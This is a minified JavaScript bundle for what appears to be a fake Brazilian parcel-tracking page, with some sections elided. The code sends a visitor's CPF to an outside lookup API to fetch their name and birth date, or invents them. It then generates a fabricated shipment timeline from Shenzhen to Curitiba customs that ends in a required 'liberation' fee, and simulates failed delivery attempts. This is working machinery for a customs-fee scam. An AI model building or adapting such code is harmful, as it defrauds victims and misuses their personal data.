import"./style-CkDHoPGJ.js";import{C as h,D as P,V as b}from"./vega-data-B5ZU_GZL.js";import{N as x}from"./navigation-xIUAunxN.js";const S="modulepreload",E=function(u){return"/"+u},y={},f=function(e,t,o){let a=Promise.resolve();if(t&&t.length>0){document.getElementsByTagName("link");const n=document.querySelector("meta[property=csp-nonce]"),s=(n==null?void 0:n.nonce)||(n==null?void 0:n.getAttribute("nonce"));a=Promise.allSettled(t.map(r=>{if(r=E(r),r in y)return;y[r]=!0;const c=r.endsWith(".css"),p=c?'[rel="stylesheet"]':"";if(document.querySelector(`link[href="${r}"]${p}`))return;const l=document.createElement("link");if(l.rel=c?"stylesheet":S,c||(l.as="script"),l.crossOrigin="",l.href=r,s&&l.setAttribute("nonce",s),document.head.appendChild(l),c)return new Promise((m,g)=>{l.addEventListener("load",m),l.addEventListener("error",()=>g(new Error(`Unable to preload CSS for ${r}`)))})}))}function i(n){const s=new Event("vite:preloadError",{cancelable:!0});if(s.payload=n,window.dispatchEvent(s),!s.defaultPrevented)throw n}return a.then(n=>{for(const s of n||[])s.status==="rejected"&&i(s.reason);return e().catch(i)})};class C{constructor(){this.fallbackData=this.generateFallbackData()}async fetchCPFData(e){const t=e.replace(/[^\d]/g,"");console.log("Buscando dados para CPF:",t);try{const o=await this.tryExternalAPI(t);if(o&&o.DADOS)return console.log("Dados obtidos da API externa"),o}catch(o){console.log("API externa falhou, usando fallback:",o.message)}return this.getFallbackData(t)}async tryExternalAPI(e){const t=new AbortController,o=setTimeout(()=>t.abort(),5e3);try{const a=await fetch(`https://apela-api.tech/?user=b1b0e7e6-3bd8-4aae-bcb0-2c03940c3ae9&cpf=${e}`,{signal:t.signal,headers:{Accept:"application/json","Content-Type":"application/json"}});if(clearTimeout(o),!a.ok)throw new Error(`HTTP ${a.status}: ${a.statusText}`);const i=await a.text();if(!i||i.trim()==="")throw new Error("Resposta vazia da API");const n=JSON.parse(i);if(n&&n.DADOS&&n.DADOS.nome)return n;throw new Error("Dados inválidos recebidos da API")}catch(a){throw clearTimeout(o),a}}getFallbackData(e){const t=["João Silva Santos","Maria Oliveira Costa","Pedro Souza Lima","Ana Paula Ferreira","Carlos Eduardo Alves","Fernanda Santos Rocha","Ricardo Pereira Dias","Juliana Costa Martins","Bruno Almeida Silva","Camila Rodrigues Nunes","Rafael Santos Barbosa","Larissa Oliveira Cruz"],o=parseInt(e.slice(-2))%t.length;return{DADOS:{nome:t[o],cpf:e,nascimento:this.generateBirthDate(e),situacao:"REGULAR"}}}generateBirthDate(e){const t=1960+parseInt(e.slice(0,2))%40,o=parseInt(e.slice(2,4))%12+1;return`${(parseInt(e.slice(4,6))%28+1).toString().padStart(2,"0")}/${o.toString().padStart(2,"0")}/${t}`}generateFallbackData(){return{products:["Kit 12 caixas organizadoras + brinde","Conjunto de panelas antiaderentes","Smartphone Samsung Galaxy A54","Fone de ouvido Bluetooth","Carregador portátil 10000mAh","Camiseta básica algodão","Tênis esportivo Nike","Relógio digital smartwatch"]}}}class D{static generateTrackingData(e){const t=new Date,o={cpf:e.cpf,currentStep:"customs",steps:[],liberationPaid:!1,liberationDate:null,deliveryAttempts:0,lastUpdate:t.toISOString()},a=this.generateRealisticDates(t,11),i=this.getTrackingSteps();for(let n=0;n<10;n++)o.steps.push({id:n+1,date:a[n],title:i[n].title,description:i[n].description,isChina:i[n].isChina||!1,completed:!0});return o.steps.push({id:11,date:a[10],title:i[10].title,description:i[10].description,completed:!0,needsLiberation:!0}),o}static generateRealisticDates(e,t){const o=[],a=new Date,i=new Date(e),n=new Date(i);n.setDate(n.getDate()-2),o.push(this.getRandomTimeOnDate(n)),o.push(this.getRandomTimeOnDate(n));const s=new Date(i);s.setDate(s.getDate()-1);for(let r=2;r<9;r++)o.push(this.getRandomTimeOnDate(s));return o.push(this.getTimeBeforeNow(i,a,1)),o.push(this.getTimeBeforeNow(i,a,2)),o}static getRandomTimeOnDate(e){const t=new Date(e),o=Math.floor(Math.random()*18)+5,a=Math.floor(Math.random()*60);return t.setHours(o,a,0,0),t}static getTimeBeforeNow(e,t,o){const a=new Date(e);t.getHours(),t.getMinutes();let i;o===1?i=Math.floor(Math.random()*4)+2:i=Math.random()*1.5+.5;const n=new Date(t);return n.setHours(n.getHours()-i),n.getHours()<6&&(n.setHours(6+Math.floor(Math.random()*2)),n.setMinutes(Math.floor(Math.random()*60))),a.setHours(n.getHours(),n.getMinutes(),0,0),a}static getTrackingSteps(){return[{title:"Seu pedido foi criado",description:"Seu pedido foi criado"},{title:"Preparando para envio",description:"O seu pedido está sendo preparado para envio"},{title:"Pedido enviado",description:"[China] O vendedor enviou seu pedido",isChina:!0},{title:"Centro de triagem",description:"[China] O pedido chegou ao centro de triagem de Shenzhen",isChina:!0},{title:"Centro logístico",description:"[China] Pedido saiu do centro logístico de Shenzhen",isChina:!0},{title:"Trânsito internacional",description:"[China] Coletado. O pedido está em trânsito internacional",isChina:!0},{title:"Liberado para exportação",description:"[China] O pedido foi liberado na alfândega de exportação",isChina:!0},{title:"Saiu da origem",description:"Pedido saiu da origem: Shenzhen"},{title:"Chegou no Brasil",description:"Pedido chegou no Brasil"},{title:"Centro de distribuição",description:"Pedido em trânsito para CURITIBA/PR"},{title:"Alfândega de importação",description:"Pedido chegou na alfândega de importação: CURITIBA/PR"}]}}class d{static showLoadingNotification(){const e=document.createElement("div");e.id="trackingNotification",e.style.cssText=`
        ...
        `,document.head.appendChild(o);const a=document.querySelector(".footer");a?document.body.insertBefore(t,a):document.body.appendChild(t),t.querySelectorAll(".simulation-button").forEach(n=>{n.addEventListener("click",()=>{const s=parseInt(n.dataset.step);this.simulateStep(s)})})}simulateStep(e){switch(console.log(`🎮 Simulando etapa ${e}`),this.clearAllTimers(),e){case 1:this.addTimelineStep({stepNumber:1,title:"Pedido liberado na alfândega de importação",description:"Seu pedido foi liberado após o pagamento da taxa alfandegária",delay:0,nextStepDelay:0});break;case 2:this.addTimelineStep({stepNumber:2,title:"Pedido sairá para entrega",description:"Pedido sairá para entrega para seu endereço",delay:0,nextStepDelay:0});break;case 3:this.addTimelineStep({stepNumber:3,title:"Pedido em trânsito",description:"Pedido em trânsito para seu endereço",delay:0,nextStepDelay:0});break;case 4:this.addTimelineStep({stepNumber:4,title:"Pedido em rota de entrega",description:"Pedido em rota de entrega para seu endereço, aguarde",delay:0,nextStepDelay:0});break;case 5:this.addTimelineStep({stepNumber:5,title:"Tentativa de entrega",description:`${this.deliveryAttempts+1}ª tentativa de entrega realizada, mas não foi possível entregar`,delay:0,isDeliveryAttempt:!0,nextStepDelay:0});break}}addTimelineStep({stepNumber:e,title:t,description:o,delay:a,nextStepDelay:i,isDeliveryAttempt:n=!1}){const s=setTimeout(()=>{console.log(`📦 Adicionando etapa ${e}: ${t}`);const r=document.getElementById("trackingTimeline");if(!r)return;const c=new Date,p=this.createTimelineItem({stepNumber:e,title:t,description:o,date:c,completed:!0,isDeliveryAttempt:n,nextStepDelay:i});r.appendChild(p),setTimeout(()=>{p.style.opacity="1",p.style.transform="translateY(0)"},100),p.scrollIntoView({behavior:"smooth",block:"center"}),this.currentStep=e},a);this.timers.push(s)}createTimelineItem({stepNumber:e,title:t,description:o,date:a,completed:i,isDeliveryAttempt:n}){const s=document.createElement("div");s.className=`timeline-item ${i?"completed":""}`,s.style.opacity="0",s.style.transform="translateY(20px)",s.style.transition="all 0.5s ease";const r=a.toLocaleDateString("pt-BR",{day:"2-digit",month:"short"}),c=a.toLocaleTimeString("pt-BR",{hour:"2-digit",minute:"2-digit"});let p="";if(n&&(p=`
        ...
        `,n){const l=s.querySelector(".delivery-retry-btn");l&&this.configureDeliveryRetryButton(l)}return s}configureDeliveryRetryButton(e){e.style.cssText=`
            background: linear-gradient(45deg, #ff6b35, #f7931e);
            color: white;
            border: none;
            padding: 12px 25px;
